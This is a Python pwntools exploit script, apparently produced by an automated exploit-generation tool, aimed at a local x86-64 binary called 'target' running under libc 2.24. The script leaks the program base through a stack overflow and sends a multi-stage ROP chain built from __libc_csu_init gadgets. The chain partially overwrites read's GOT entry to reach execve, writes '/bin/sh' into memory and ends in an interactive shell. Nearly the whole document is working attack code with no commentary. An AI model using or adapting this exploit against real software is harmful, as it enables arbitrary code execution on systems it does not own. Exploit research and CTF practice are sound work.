#!/usr/bin/env python3
from pwn import *
context.update(arch = 'amd64', os = 'linux', log_level = 'info')

target = ELF('./target', checksec=False)
libc_2_24_so = ELF('./libc-2.24.so', checksec=False)

__libc_csu_init = 0x11c0
__libc_csu_init_call_target = 0x4870
__libc_csu_init_gadget1 = 0x1216
__libc_csu_init_gadget2 = 0x1200
canary = 0x0
libc_2_24_so_base = 0x0
pivot_dest = 0x4838
target_base = 0x0
target_pop_rsi_pop_r15_ret = 0x1221

def solve_stage1(canary, elf_base, iostates) -> bytes:
    os.system('./launch-crax.sh -c {} -e {} -s {}'.format(hex(canary), hex(elf_base), iostates))
    with open('stage1.bin', 'rb') as f:
        return f.read()

if __name__ == '__main__':
    proc = process(['./ld-2.24.so', './target'], env={'LD_PRELOAD': './libc-2.24.so'})

    # input state (offset = 56)
    proc.send(b'\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41')

    # output state
    # leaking: code
    proc.recv(56)
    leaked = u64(proc.recv(6).ljust(8, b'\x00'))
    target_base = leaked - 0x1169
    log.info('leaked ELF base: {}'.format(hex(target_base)))
    proc.recvrepeat(0.1)

    # input state (offset = 128), skipped

    # input state (offset = 128), skipped

    # input state (offset = 128)
    # input state (rop chain begin)
    payload  = solve_stage1(canary, target_base, 'i56,o56,i128,i128,i128')[56:312]
    proc.send(payload)
    time.sleep(0.2)

    payload  = p64(target_base + target_pop_rsi_pop_r15_ret)
    payload += p64(target_base + pivot_dest + 0x8 + 0x30 * 0x1)
    payload += p64(0x0)
    payload += p64(target_base + target.sym['read'])
    payload += p64(target_base + target_pop_rsi_pop_r15_ret)
    payload += p64(target_base + pivot_dest + 0x8 + 0x30 * 0x2)
    proc.send(payload)
    time.sleep(0.2)

    payload  = p64(target_base + target.sym['_fini'])
    payload += p64(target_base + target.sym['read'])
    payload += p64(target_base + target_pop_rsi_pop_r15_ret)
    payload += p64(target_base + pivot_dest + 0x8 + 0x30 * 0x3)
    payload += p64(0x0)
    payload += p64(target_base + target.sym['read'])
    proc.send(payload)
    time.sleep(0.2)

    payload  = p64(target_base + target_pop_rsi_pop_r15_ret)
    payload += p64(target_base + pivot_dest + 0x8 + 0x30 * 0x4)
    payload += p64(0x0)
    payload += p64(target_base + target.sym['read'])
    payload += p64(target_base + target_pop_rsi_pop_r15_ret)
    payload += p64(target_base + pivot_dest + 0x8 + 0x30 * 0x5)
    proc.send(payload)
    time.sleep(0.2)

    payload  = p64(0x0)
    payload += p64(target_base + target.sym['read'])
    payload += p64(target_base + target_pop_rsi_pop_r15_ret)
    payload += p64(target_base + pivot_dest + 0x8 + 0x30 * 0x6)
    payload += p64(0x0)
    payload += p64(target_base + target.sym['read'])
    proc.send(payload)
    time.sleep(0.2)

    payload  = p64(target_base + __libc_csu_init_gadget1)
    payload += p64(0x4141414141414141)
    payload += p64(0x0)
    payload += p64(0x1)
    payload += p64(0x0)
    payload += p64(target_base + pivot_dest + 0x30 * 0x7)
    proc.send(payload)
    time.sleep(0.2)

    payload  = p64(0x400)
    payload += p64(target_base + __libc_csu_init_call_target)
    payload += p64(target_base + __libc_csu_init_gadget2)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    proc.send(payload)
    time.sleep(0.2)

    payload  = p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(target_base + target.sym['read'])
    proc.send(payload)
    time.sleep(0.2)

    payload  = p64(target_base + __libc_csu_init_gadget1)
    payload += p64(0x4141414141414141)
    payload += p64(0x0)
    payload += p64(0x1)
    payload += p64(0x0)
    payload += p64(target_base + target.got['read'])
    payload += p64(0x1)
    payload += p64(target_base + __libc_csu_init_call_target)
    payload += p64(target_base + __libc_csu_init_gadget2)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(target_base + target.sym['read'])
    payload += p64(target_base + __libc_csu_init_gadget1)
    payload += p64(0x4141414141414141)
    payload += p64(0x0)
    payload += p64(0x1)
    payload += p64(0x1)
    payload += p64(0x0)
    payload += p64(0x0)
    payload += p64(target_base + __libc_csu_init_call_target)
    payload += p64(target_base + __libc_csu_init_gadget2)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(target_base + target.sym['read'])
    payload += p64(target_base + __libc_csu_init_gadget1)
    payload += p64(0x4141414141414141)
    payload += p64(0x0)
    payload += p64(0x1)
    payload += p64(0x0)
    payload += p64(target_base + target.bss())
    payload += p64(0x3b)
    payload += p64(target_base + __libc_csu_init_call_target)
    payload += p64(target_base + __libc_csu_init_gadget2)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(target_base + target.sym['read'])
    payload += p64(target_base + __libc_csu_init_gadget1)
    payload += p64(0x4141414141414141)
    payload += p64(0x0)
    payload += p64(0x1)
    payload += p64(target_base + target.bss())
    payload += p64(0x0)
    payload += p64(0x0)
    payload += p64(target_base + __libc_csu_init_call_target)
    payload += p64(target_base + __libc_csu_init_gadget2)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(target_base + 0x1223)
    payload += p64(target_base + target.bss())
    payload += p64(target_base + target.sym['read'])
    proc.send(payload)
    time.sleep(0.2)

    payload  = b'\x0e'
    proc.send(payload)
    time.sleep(0.2)

    payload  = b'\x2f\x62\x69\x6e\x2f\x73\x68\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
    proc.send(payload)
    time.sleep(0.2)

    proc.interactive()
